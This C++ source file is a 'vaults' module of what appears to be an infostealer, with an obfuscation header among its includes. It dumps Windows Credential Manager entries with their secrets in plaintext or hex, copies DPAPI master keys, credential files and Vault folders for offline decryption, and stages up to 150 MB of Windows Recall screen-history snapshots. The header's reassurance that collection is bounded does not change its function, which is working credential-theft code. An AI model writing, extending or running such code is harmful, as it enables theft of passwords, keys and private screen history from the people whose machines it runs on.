// Windows credential vaults: Credential Manager entries (CredEnumerate),
// DPAPI master keys + credential blobs (for offline decryption), Vault
// directories, and Windows Recall snapshot stores. All collection is
// bounded; nothing is decrypted here that the OS would not already hand
// the current user.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include <sstream>
#include <algorithm>

#include <windows.h>
#include <wincred.h>

namespace {

std::string utf16_to_utf8(const std::vector<uint8_t>& raw) {
    if (raw.size() < 2) return "";
    std::wstring w((const wchar_t*)raw.data(), raw.size() / 2);
    return util::narrow(w);
}

std::string hex_of(const uint8_t* data, size_t len, size_t cap = 4096) {
    static const char* d = "0123456789abcdef";
    std::string s;
    size_t n = len > cap ? cap : len;
    s.reserve(n * 2);
    for (size_t i = 0; i < n; ++i) {
        s += d[data[i] >> 4];
        s += d[data[i] & 0xF];
    }
    if (len > cap) s += "...";
    return s;
}

std::string blob_to_display(const PCREDENTIALW c) {
    std::vector<uint8_t> raw(c->CredentialBlob, c->CredentialBlob + c->CredentialBlobSize);
    // Generic credentials store the secret as UTF-16. Try it first; fall back
    // to hex for binary payloads (domain hashes, NTLM material...).
    std::string utf8 = utf16_to_utf8(raw);
    bool printable = !utf8.empty();
    for (char ch : utf8) {
        unsigned char u = (unsigned char)ch;
        if (u < 0x20 && ch != '\t' && ch != '\r' && ch != '\n') { printable = false; break; }
    }
    if (printable && utf8.size() >= 2 && utf8.size() <= 1024) return utf8;
    return "hex:" + hex_of(c->CredentialBlob, c->CredentialBlobSize);
}

const char* cred_type_name(DWORD t) {
    switch (t) {
        case CRED_TYPE_GENERIC: return "generic";
        case CRED_TYPE_DOMAIN_PASSWORD: return "domain-password";
        case CRED_TYPE_DOMAIN_CERTIFICATE: return "domain-certificate";
        case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: return "domain-visible-password";
        default: return "other";
    }
}

void dump_credential_manager(const std::string& staging, std::ostringstream& summary) {
    DWORD count = 0;
    PCREDENTIALW* creds = nullptr;
    if (!CredEnumerateW(nullptr, 0, &count, &creds)) {
        summary << "  Credential Manager: none (err " << GetLastError() << ")\r\n";
        return;
    }
    std::ostringstream out;
    for (DWORD i = 0; i < count; ++i) {
        PCREDENTIALW c = creds[i];
        FILETIME ft = c->LastWritten;
        SYSTEMTIME st{};
        FileTimeToSystemTime(&ft, &st);
        char when[32];
        snprintf(when, sizeof(when), "%04d-%02d-%02d %02d:%02d", st.wYear, st.wMonth, st.wDay,
                 st.wHour, st.wMinute);
        out << "target: " << util::narrow(c->TargetName ? c->TargetName : L"") << "\r\n";
        out << "user:   " << util::narrow(c->UserName ? c->UserName : L"") << "\r\n";
        out << "type:   " << cred_type_name(c->Type) << "\r\n";
        out << "persist: " << c->Persist << " | written: " << when << "\r\n";
        if (c->Comment) out << "comment: " << util::narrow(c->Comment) << "\r\n";
        out << "secret: " << blob_to_display(c) << "\r\n---\r\n";
    }
    CredFree(creds);
    stage::stage_text("vaults", "credential_manager.txt", out.str());
    summary << "  Credential Manager: " << count << " entries\r\n";
}

// list files (full path + last write time), recursive, bounded depth
struct FileHit { std::string path; unsigned long long mtime; unsigned long long size; };

void collect_files_info(const std::string& dir, int depth, std::vector<FileHit>& out, int budget) {
    if (depth < 0 || (int)out.size() >= budget) return;
    WIN32_FIND_DATAW fd{};
    std::wstring pattern = util::widen(dir + "\\*");
    HANDLE h = FindFirstFileW(pattern.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        std::wstring name = fd.cFileName;
        if (name == L"." || name == L"..") continue;
        std::string full = dir + "\\" + util::narrow(name);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            collect_files_info(full, depth - 1, out, budget);
        } else {
            FileHit fh;
            fh.path = full;
            fh.mtime = ((unsigned long long)fd.ftLastWriteTime.dwHighDateTime << 32) |
                       fd.ftLastWriteTime.dwLowDateTime;
            fh.size = ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            out.push_back(fh);
        }
        if ((int)out.size() >= budget) break;
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

void stage_bounded(const std::string& module, const std::string& file, const std::string& label) {
    std::vector<uint8_t> data;
    if (!util::read_file(file, data) || data.empty()) return;
    std::string flat = util::replace_all(label, "\\", "_");
    flat = util::replace_all(flat, " ", "_");
    stage::stage_bytes(module, flat, data);
}

// copy a directory tree with per-file and total caps
void stage_tree(const std::string& module, const std::string& root, const std::string& prefix,
                size_t per_file_cap, size_t total_cap, int budget_files = 2000) {
    std::vector<FileHit> files;
    collect_files_info(root, 8, files, budget_files);
    size_t total = 0;
    int n = 0;
    for (auto& f : files) {
        if (total >= total_cap) break;
        if (f.size == 0 || f.size > per_file_cap * 4) continue;
        std::vector<uint8_t> data;
        if (!util::read_file(f.path, data) || data.empty()) continue;
        if (data.size() > per_file_cap) data.resize(per_file_cap);
        if (!stage::stage_bytes(module, prefix + "_" + util::filename_of(f.path), data)) break;
        total += data.size();
        ++n;
    }
    (void)n;
}

void collect_recall(const std::string& staging, std::ostringstream& summary) {
    std::string base = util::join(util::env("LOCALAPPDATA"), "CoreAIPlatform.00");
    if (!util::is_dir(base)) {
        summary << "  Recall: not present\r\n";
        return;
    }
    // ukg.db first (snapshot index), then most recent captured files up to a cap.
    std::vector<FileHit> files;
    collect_files_info(base, 8, files, 4000);
    std::sort(files.begin(), files.end(), [](const FileHit& a, const FileHit& b) {
        bool adb = util::ends_with(util::to_lower(a.path), "ukg.db");
        bool bdb = util::ends_with(util::to_lower(b.path), "ukg.db");
        if (adb != bdb) return adb;
        return a.mtime > b.mtime;
    });
    const size_t k_total_cap = 150ull * 1024 * 1024;
    size_t total = 0;
    int staged = 0;
    for (auto& f : files) {
        if (total >= k_total_cap) break;
        if (f.size == 0) continue;
        std::vector<uint8_t> data;
        if (!util::read_file(f.path, data) || data.empty()) continue;
        if (data.size() > 48ull * 1024 * 1024) data.resize(48ull * 1024 * 1024);
        if (!stage::stage_bytes("vaults", "recall_" + util::filename_of(f.path), data)) break;
        total += data.size();
        ++staged;
    }
    summary << "  Recall: " << staged << " files staged (" << (total / (1024 * 1024)) << " MB) from "
            << files.size() << " candidates\r\n";
}

} // namespace

namespace mod {

void vaults(const std::string& staging) {
    std::ostringstream summary;

    // 1. live Credential Manager readout
    dump_credential_manager(staging, summary);

    // 2. raw blobs for offline decryption: DPAPI master keys, credential
    //    files, vaults and credential history
    std::string appdata = util::env("APPDATA");
    std::string localappdata = util::env("LOCALAPPDATA");

    struct Tree { const char* path; const char* prefix; };
    const Tree trees[] = {
        {"%APPDATA%\\Microsoft\\Credentials", "cred"},
        {"%APPDATA%\\Microsoft\\Protect", "dpapi_masterkey"},
        {"%APPDATA%\\Microsoft\\Vault", "vault_roaming"},
        {"%LOCALAPPDATA%\\Microsoft\\Vault", "vault_local"},
        {"%LOCALAPPDATA%\\Microsoft\\Credentials", "cred_local"},
    };
    for (auto& t : trees) {
        std::string root = util::expand_env(t.path);
        if (!util::is_dir(root)) continue;
        stage_tree("vaults", root, t.prefix, 2ull * 1024 * 1024, 24ull * 1024 * 1024);
    }
    (void)appdata;
    (void)localappdata;
    summary << "  dpapi/credential blobs staged (Credentials, Protect, Vault)\r\n";

    // 3. Windows Recall snapshots (AI screen history)
    collect_recall(staging, summary);

    stage::note("vaults", summary.str());
}

} // namespace mod
